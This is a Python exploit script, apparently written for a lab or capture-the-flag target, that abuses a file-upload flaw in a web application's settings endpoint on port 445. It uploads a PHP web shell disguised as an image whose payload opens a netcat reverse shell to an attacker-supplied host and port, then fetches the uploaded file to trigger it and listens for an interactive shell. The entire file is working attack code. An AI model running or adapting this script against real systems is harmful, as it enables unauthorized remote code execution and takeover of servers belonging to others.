#!/usr/bin/python3

from pwn import *
import argparse
import re
import requests
import threading
import time
import sys
import signal

# ctrl+c 
def def_handler(sig, frame):
    print("\n\n[!] Exit...\n")    
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Configurar el parser de argumentos
parser = argparse.ArgumentParser()
parser.add_argument('-v', '--ip', help='IP address victim')
parser.add_argument('-i', '--lhosts', help='Attacker host')
parser.add_argument('-p', '--lport', help='Attacker port')

# Obtener el valor del argumento
args = parser.parse_args()
ip_address = args.ip
lport = args.lport
lhosts = args.lhosts

# variables
main_url = "http://{0}:445/management/admin/login.php".format(ip_address)
shell_url = "http://{0}:445/management/classes/SystemSettings.php?f=update_settings".format(ip_address)
uploads_directory = "http://{0}:445/management/uploads/".format(ip_address)
file_pattern = r"\d+_helloCmd\.php"

def verificacion():
    if None in [args.ip, args.lhosts, args.lport]:
        print(parser.format_help())
        sys.exit(1)
  
def ReverseShell():
    
    cmd =  '''<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {} {} >/tmp/f");
    ?>'''.format(lhosts, lport)
    
    pushShell = {
        'img': ('helloCmd.php', cmd)
    }
    
    response = requests.post(shell_url, files=pushShell)
    if response.status_code == 200:
        log.success('POST request successful. Answer: %s', response.text)
    else:
        log.success('POST request successful. Answer: %s, Code: %d', response.text, response.status_code)

def Uploads_cmd():
    
    time.sleep(2)
    response = requests.get(uploads_directory)
    
    if response.status_code == 200:
        matching_files = re.findall(file_pattern, response.text)
        
        if matching_files:
            file_name = matching_files[0]
            file_url= uploads_directory + file_name
            response_file = requests.get(file_url)
            
            if response_file.status_code == 200:
                log.success("shell found successfully")
            else: 
                log.error("Failed to find shell")
            
def main():
    try:
        verificacion()
        ReverseShell()
        threading.Thread(target=Uploads_cmd, args=()).start()
        
        shell = listen(lport, timeout=20).wait_for_connection()
        
        if shell.sock is None:
            log.failure("Could not establish connection")
            sys.exit(1)
        else:
            shell.interactive()
            
    except Exception as e:
        log.error(str(e))
        sys.exit(1)

if __name__ == '__main__':
    
    main()